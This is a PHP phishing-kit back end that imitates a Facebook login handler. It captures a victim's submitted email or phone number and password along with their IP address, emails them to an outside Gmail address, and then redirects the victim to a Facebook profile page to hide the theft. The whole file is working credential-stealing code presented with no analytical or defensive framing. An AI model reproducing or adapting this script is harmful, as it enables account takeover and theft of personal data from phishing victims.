<?php
  $email = $_POST['us'];
  $parola = $_POST['ps'];

$ip = $_SERVER['REMOTE_ADDR'];


  $ip_addresse = getenv('HTTP_CLIENT_IP')?:
  getenv('HTTP_X_FORWARDED_FOR')?:
  getenv('HTTP_X_FORWARDED')?:
  getenv('HTTP_FORWARDED_FOR')?:
  getenv('HTTP_FORWARDED')?:
  getenv('REMOTE_ADDR');
  $subject = "Facebook". $ip_addresse ."  -";
$headers = "From: " . strip_tags($_POST['fb1@dictatetexture.com
']) . "\r\n";
$headers .= "Reply-To: ". strip_tags($_POST['fb1@dictatetexture.com
']) . "\r\n";
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

  $message = "<div style='text-align: center; width: 400px'>"; 
  $message = '<html><body>';
  $message .= "----------------------  Facebook  ------------------------- <br><br>";
  $message .= "<b> Email/Phone : </b> <span style='color: #3498DB;'>$email</span> <br><br>";
  $message .= "<b> Password : </b> <span style='color: #3498DB;'>$parola</span> <br><br>";
  $message .= "<b> </br>";
  $message .= "<b> IP : </b> <span style='color: #FC575E;'>$ip</span> <br><br>";
  $message .= "<b> </br>";
  $message .= "<b> </br>";

  $message .= "------------------- Copyright spammers@jabber.root.cz ------------------------- <br><br>";
 $message .= '</body></html>';
  $to = "alc.wld88@gmail.com";
  mail($to, $subject, $message, $headers);
  echo "<script>window.location.href='https://www.facebook.com/jessica.newman.127'</script>";
?>